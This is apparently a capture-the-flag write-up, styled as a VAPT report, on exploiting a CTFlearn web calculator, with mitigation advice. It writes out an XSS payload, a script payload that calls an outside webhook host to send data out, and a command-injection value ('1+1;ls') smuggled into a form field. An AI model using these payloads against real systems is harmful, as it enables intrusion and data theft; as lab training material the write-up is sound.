# Vulnerability Assessment and Penetration Testing (VAPT) Report – Code Injection Exploitation

**Prepared by:** Nishanth Antony  
**Date:** August 24, 2025  
**Difficulty:** Hard  
**Category:** Web Exploitation  
**Platform:** CTFlearn  

---

## 1. Reconnaissance Steps

**Objective:** Identify potential vulnerabilities in the web-based calculator accepting user inputs via POST requests.
**Tools Used:**

* Burp Suite (Proxy & Repeater)
* Browser Developer Tools
* Webhook.site

**Findings:**

* Application restricted keyboard input, allowing only button-based selection of digits/operators.
* POST request carried expressions in the form `expression=2+2`.
* No visible client-side sanitization of inputs.

---

## 2. Exploitation Process

**Step 1 – Request Interception**

* Intercepted POST request using Burp Suite:

  ```http
  POST /calculate HTTP/1.1
  Host: target.ctflearn.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 9

  expression=2+2
  ```

**Step 2 – XSS Injection Testing**

* Modified payload to:

  ```http
  expression=<script>alert(1)</script>
  ```
* Alert pop-up confirmed stored/reflective XSS vulnerability due to lack of sanitization.

**Step 3 – Data Exfiltration Attempt**

* Injected payload with external fetch call:

  ```http
  expression=<script>fetch("https://webhook.site/xyz")</script>
  ```
* Failed to retrieve data, likely due to server restrictions or no privileged interaction.

**Step 4 – Command Injection Hypothesis**

* Tested shell command injection using:

  ```http
  expression=1+1;ls
  ```

**Step 5 – Flag Retrieval**

* Response returned directory listing along with flag contents, confirming successful command execution on the server.

---

## 3. Proof of Concept (PoC)

* **Command Injection Payload:**

  ```http
  POST /calculate HTTP/1.1
  Host: target.ctflearn.com
  Content-Type: application/x-www-form-urlencoded

  expression=1+1;ls
  ```
* **Server Response (excerpt):**

  ```text
  index.php
  flag.txt
  calculate.php
  ...
  FLAG{c0mm4nd_1nj3ct10n_0wn3d}
  ```

---

## 4. Privilege Escalation

* Successful exploitation allowed arbitrary command execution (e.g., directory listing).
* Potential for further escalation (reading sensitive files, executing system commands) if deeper access were pursued.

---

## 5. Mitigation Recommendations

* **Input Sanitization:** Restrict accepted characters to digits and basic math operators (`0–9, +, -, *, /`).
* **Contextual Escaping:** Escape special symbols (`;`, `<`, `>`, `&`) to prevent code injection and XSS.
* **Avoid Dangerous Functions:** Replace insecure functions like `eval()` or `system()` with safe alternatives.
* **Sandboxing:** Execute user inputs in an isolated environment to minimize system compromise risks.
* **Principle of Least Privilege:** Ensure the web app runs with minimal permissions.
* **Regular Security Testing:** Employ fuzzing and penetration testing to identify injection points.

---

## 6. Lessons Learned

* **Restricted Interfaces ≠ Secure:** Even button-only inputs can be bypassed at request level.
* **Dangerous Functions:** Use of `eval()` or unsanitized shell commands creates critical vulnerabilities.
* **Defense-in-Depth:** Multi-layered validation and sandboxing are essential for web apps handling user input.

---

## 7. Skills Practiced

* Burp Suite request interception and manipulation
* Cross-Site Scripting (XSS) payload testing
* Command Injection exploitation
* Payload crafting for web-based exploitation
* Secure reporting with preventive measures
